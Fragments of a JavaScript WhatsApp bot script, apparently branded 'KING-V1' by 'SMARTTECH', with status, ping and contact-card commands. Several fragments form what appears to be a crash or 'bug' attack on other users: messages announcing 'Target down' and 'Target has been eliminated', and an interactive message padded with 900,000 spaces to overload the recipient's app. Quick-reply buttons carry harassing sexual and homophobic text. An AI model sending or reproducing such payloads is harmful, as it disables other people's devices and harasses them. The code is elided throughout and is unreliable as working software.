...
await ryozingod.updateProfileStatus(`✳️ KINGXV - Client By : SMARTTECH|| ✅ Runtime : ${uptime}`)
...
title: `© KING Version 1.1.1`,
body: `${ucapanWaktu} ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl:`https://whatsapp.com/channel/0029VagedTB9Bb5zsNOHn91P`,
mediaUr`https://whatsapp.com/channel/0029VagedTB9Bb5zsNOHn91P',
}
},
text: teks
}, {
...
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By SMARTTECH Execution Vault',
"serverMessageId": 1
},
},
"header": {
...
"footer": {
"text": "⿻   SMARTTECH Execution Vault   ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"KING-𝓿1\nI LIKE YOUR BOOL HOLE, LET'S FUCK IT😋😘\",\"id\":\".terkentod\"}"
}
],
"messageParamsJson": ""
}
...
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"⿻SMARTTECH⿻\nI think You are a gay😋😘\",\"id\":\".terkentod\"}"
}
],
"messageParamsJson": ""
}
...
❕𝐎𝐖𝐍𝐄𝐑 : https://api.whatsapp.com/send?phone=+2348160141238
❗𝐒𝐂𝐑𝐈𝐏𝐓: https://whatsapp.com/channel/0029VagedTB9Bb5zsNOHn91P
...
let namaown = `SMARTTECH`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ KING-V1 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ KING-V1 ༑ ]]\nEND:VCARD`,
}
...
//=================================================//
case 'runtime':
                let pinga = ` ◈ ━━━━━━━ ⸙ KING-V1  ⸙ ━━━━━━━ ◈𝖗 Is Active${runtime(process.uptime())}`
                ryozingod.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `KING-V1`,
                            body: `KING`,
                            thumbnailUrl: 'https://telegra.ph/file/72b71fd827a59ce8ad3c3.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VagedTB9Bb5zsNOHn91P',         mediaType: 1,
...
case 'ping': {
  ...
  const pingMsg = await ryozingod.sendMessage(m.chat, { text: '*ĶÎŃĞ-𝓿1*' });
 ...
 await ryozingod.relayMessage(m.chat, {
      protocolMessage: {
        ...
        type: 14,
        editedMessage: {
          conversation: `*KING ν1 𝚂𝙿𝙴𝙴𝙳 ➟* *${new Date() - startTime}* 𝙼𝚂`
        }
      }
    }, {});
  } 
...
const audiovn = "./Alive.mp3";
    const dooc = {
        ...
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "Call Me KING ν1",
          body: "https://whatsapp.com/channel/0029VagedTB9Bb5zsNOHn91P",
          thumbnailUrl: "KING ν1",
          sourceUrl: "https://whatsapp.com/channel/0029VagedTB9Bb5zsNOHn91P",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
...
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/b31c039845a708a473d6e.jpg' }, caption: ctf }, { quoted: m })
...
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ SMARTTECH💀KING-V1 ⿻`,
mediaType: 1,
mediaUrl: 'https://whatsapp.com/channel/0029VagedTB9Bb5zsNOHn91P'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *KING-V1* 𝘽𝙮 SMARTTECH 
}, {
quoted: m
})
}
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻K I N G-𝓿1⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
